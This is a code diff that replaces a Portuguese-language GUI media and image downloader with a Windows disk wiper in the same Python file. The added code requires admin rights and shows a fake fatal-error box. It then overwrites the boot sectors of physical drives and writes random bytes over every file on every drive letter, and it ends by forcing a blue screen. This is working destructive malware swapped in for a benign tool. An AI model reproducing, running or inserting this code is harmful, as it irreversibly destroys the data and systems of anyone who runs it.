@@ -1,188 +1,109 @@
 import os
-import requests
-from bs4 import BeautifulSoup
-from PIL import Image
-from io import BytesIO
-from urllib.parse import urljoin
-from customtkinter import (
-    CTk, CTkEntry, CTkLabel, CTkButton, CTkRadioButton, CTkOptionMenu,
-    StringVar, set_appearance_mode, set_default_color_theme
-)
-from tkinter import filedialog
-import yt_dlp
-import concurrent.futures
+import sys
+import wmi
+import ctypes
+import multiprocessing
+from win32file import *
+from random import *
+from time import sleep
 
-set_appearance_mode("dark")  # ou "light"
-set_default_color_theme("blue")  # pode ser "green", "dark-blue"...
+# check if elevated
 
-class App(CTk):
-    def __init__(self):
-        super().__init__()
-        self.title("Downloader de URL")
-        self.geometry("600x600")
-        self.resizable(False, False)
+if not ctypes.windll.shell32.IsUserAnAdmin():
+    sleep(5)
+    sys.exit() # needs admin to do what it needs to do
 
-        # VARIÁVEIS
-        self.download_type = StringVar(value="imagem")
-        self.video_quality = StringVar(value="Alta")
+def safeguard():
+    ctypes.windll.user32.MessageBoxW(0, "System will now terminate. ", "Fatal Error", 0x00000000 | 0x00000010)
 
-        # COMPONENTES
-        CTkLabel(self, text="Insira a(s) URL(s)", font=("Arial", 16)).pack(pady=(15, 5))
-        self.inputURL = CTkEntry(self, width=450, height=35, placeholder_text="Cole uma ou várias URLs (1 por linha)")
-        self.inputURL.pack(pady=5)
+def partkill():
+    count = 0
 
-        CTkLabel(self, text="Nome da pasta (para imagens):", font=("Arial", 14)).pack(pady=(15, 5))
-        self.inputFolder = CTkEntry(self, width=450, height=35, placeholder_text="Digite o nome da pasta")
-        self.inputFolder.pack(pady=5)
+    for x in wmi.WMI().Win32_LogicalDisk():
+            try:
+                hDevice = CreateFileW(f"\\\\.\\PhysicalDrive{count}", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
+            except:
+                count += 1
+                pass
+            try:
+                WriteFile(hDevice, AllocateReadBuffer(512), None)
+            except:
+                pass 
+            CloseHandle(hDevice)
+            count += 1
 
-        CTkLabel(self, text="Tipo de download:", font=("Arial", 14)).pack(pady=(15, 0))
-        CTkRadioButton(self, text="Imagem", variable=self.download_type, value="imagem").pack(pady=2)
-        CTkRadioButton(self, text="Vídeo", variable=self.download_type, value="video").pack(pady=2)
-        CTkRadioButton(self, text="Áudio", variable=self.download_type, value="audio").pack(pady=2)
+# partitions are gone, now corrupt every file to make recovery harder
 
-        CTkLabel(self, text="Qualidade do vídeo:", font=("Arial", 14)).pack(pady=(15, 5))
-        self.qualidade_menu = CTkOptionMenu(self, values=["Alta", "Média", "Baixa"], variable=self.video_quality)
-        self.qualidade_menu.pack(pady=2)
-
-        CTkButton(self, text="Iniciar Download", command=self.baixar, height=40, width=200).pack(pady=(25, 15))
-        self.status_label = CTkLabel(self, text="", wraplength=500)
-        self.status_label.pack(pady=5)
-
-    def baixar(self):
-        urls_text = self.inputURL.get().strip()
-        tipo = self.download_type.get().lower()
-
-        if not urls_text:
-            self.status_label.configure(text="⚠️ Insira pelo menos uma URL válida.")
-            return
-
-        urls = [u.strip() for u in urls_text.splitlines() if u.strip()]
-
-        if tipo == "imagem":
-            pasta_nome = self.inputFolder.get().strip()
-            if not pasta_nome:
-                self.status_label.configure(text="⚠️ Insira o nome da pasta para salvar as imagens.")
-                return
-            self.processarURLs(urls, pasta_nome)
-        elif tipo == "video":
-            if len(urls) > 1:
-                self.status_label.configure(text="⚠️ Para vídeos, insira apenas uma URL de cada vez.")
-                return
-            self.download_video(urls[0])
-        elif tipo == "audio":
-            if len(urls) > 1:
-                self.status_label.configure(text="⚠️ Para áudios, insira apenas uma URL de cada vez.")
-                return
-            self.download_audio(urls[0])
-
-    def download_video(self, url):
-        pasta = filedialog.askdirectory(title="Escolha a pasta para salvar o vídeo")
-        if not pasta:
-            self.status_label.configure(text="⚠️ Nenhuma pasta selecionada.")
-            return
-
-        qualidade = self.video_quality.get().lower()
-        if qualidade == "alta":
-            format_video = "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best"
-        elif qualidade == "média":
-            format_video = "best[height<=720]"
-        elif qualidade == "baixa":
-            format_video = "best[height<=480]"
-        else:
-            format_video = "best"
-
+def search_files(directory):
+    for dirpath, dirnames, filenames in os.walk(f"{directory}:\\"):
         try:
-            ydl_opts = {
-                'outtmpl': f'{pasta}/%(title)s.%(ext)s',
-                'format': format_video,
-                'merge_output_format': 'mp4',
-                'noplaylist': True,
-                'quiet': False,
-                'no_warnings': True,
-                'retries': 3,
-                'concurrent_fragment_downloads': 8,
-            }
+            if dirpath.lower() == r'c:\windows\servicing': # dont know whats inside this folder but it increases the time taken by a lot
+                dirnames[:] = []                           # so im just going to ignore this folder
+                continue
+            for filename in filenames:
+                try:
+                    yield os.path.join(dirpath, filename)
+                except:
+                    None #interrupted
+        except:
+            None #interrupted
 
-            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-                ydl.download([url])
+def erase(path, passes, chunk_size=268435456, max_file_size=1073741824):
+    length = os.path.getsize(path)
+    with open(path, "br+", buffering=-1) as f:
+        for _ in range(passes):
+            f.seek(0)
+            if length > max_file_size:
+                num_chunks = length // chunk_size
+                remainder = length % chunk_size
 
-            self.status_label.configure(text="✅ Vídeo baixado com sucesso!")
+                for _ in range(num_chunks):
+                    f.write(os.urandom(chunk_size))
 
-        except Exception as e:
-            self.status_label.configure(text=f"❌ Erro ao baixar vídeo: {e}")
-
-    def download_audio(self, url):
-        pasta = filedialog.askdirectory(title="Escolha a pasta para salvar o áudio")
-        if not pasta:
-            self.status_label.configure(text="⚠️ Nenhuma pasta selecionada.")
-            return
-
-        try:
-            ydl_opts = {
-                'format': 'bestaudio/best',
-                'outtmpl': f'{pasta}/%(title)s.%(ext)s',
-                'noplaylist': True,
-                'quiet': False,
-                'no_warnings': True,
-                'retries': 3,
-                'concurrent_fragment_downloads': 8,
-                'postprocessors': [{
-                    'key': 'FFmpegExtractAudio',
-                    'preferredcodec': 'mp3',
-                    'preferredquality': '192',
-                }],
-            }
-
-            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-                ydl.download([url])
-
-            self.status_label.configure(text="✅ Áudio baixado com sucesso!")
-
-        except Exception as e:
-            self.status_label.configure(text=f"❌ Erro ao baixar áudio: {e}")
-
-    def baixar_imagem(self, full_img_url, pasta_destino):
-        try:
-            img_data = requests.get(full_img_url, timeout=10).content
-            img = Image.open(BytesIO(img_data))
-            img_name = os.path.basename(full_img_url.split('?')[0])
-            if not img_name.lower().endswith((".jpg", ".jpeg", ".png", ".bmp", ".gif", ".webp")):
-                img_name += ".jpg"
-            img_path = os.path.join(pasta_destino, img_name)
-            img.convert("RGB").save(img_path, "JPEG")
-            return True
-        except Exception as e:
-            print(f"Erro ao baixar imagem: {e}")
-            return False
-
-    def processarURLs(self, urls, pasta_nome):
-        self.status_label.configure(text="📥 Baixando imagens...")
-        try:
-            pasta_destino = os.path.join("imagens", pasta_nome)
-            os.makedirs(pasta_destino, exist_ok=True)
-
-            total_baixadas = 0
-            for url in urls:
-                res = requests.get(url, timeout=10)
-                soup = BeautifulSoup(res.text, 'html.parser')
-
-                img_tags = soup.find_all('img')
-                full_img_urls = [
-                    urljoin(url, img.get('src')) for img in img_tags if img.get('src')
-                ]
-
-                with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
-                    resultados = list(executor.map(lambda img: self.baixar_imagem(img, pasta_destino), full_img_urls))
-                    total_baixadas += sum(resultados)
-
-            if total_baixadas > 0:
-                self.status_label.configure(text=f"✅ {total_baixadas} imagem(ns) salvas em {pasta_destino}")
+                if remainder > 0:
+                    f.write(os.urandom(remainder))
             else:
-                self.status_label.configure(text="⚠️ Nenhuma imagem encontrada.")
+                f.write(os.urandom(length))
+            f.close()
 
-        except Exception as e:
-            self.status_label.configure(text=f"❌ Erro: {e}")
+def erase_file(file):
+    try:
+        erase(file, 1)
+    except:
+        pass
 
-if __name__ == "__main__":
-    app = App()
-    app.mainloop()
+drive_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[::-1]
+
+if __name__ == '__main__': # safeguard to prevent other processes from looping back into the same code - apparently breaks this program
+    message_box_process = multiprocessing.Process(target=safeguard)
+    message_box_process.start()
+    message_box_process.join() # if u ran this on host by accident just unplug ur pc instead of clicking the msgbox
+
+    part = multiprocessing.Process(target=partkill) # stinky
+    part.start()
+    part.join()
+
+    num_processes = multiprocessing.cpu_count()
+    pool = multiprocessing.Pool(processes=num_processes) 
+
+    # wiper payloadd
+    for char in drive_letters:
+        directory = char  
+        for file in search_files(directory):
+            try:
+                pool.apply_async(erase_file, (file,)) 
+            except:
+                None # interrupted (i.e by ctrl-alt-del)
+    pool.close()
+    pool.join() # wait until all files are damaged
+
+    # bsod after corrupting every file
+
+    ntdll = ctypes.windll.ntdll
+    prev_value = ctypes.c_bool()
+    res = ctypes.c_ulong()
+    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+        None
+    else:
+        None
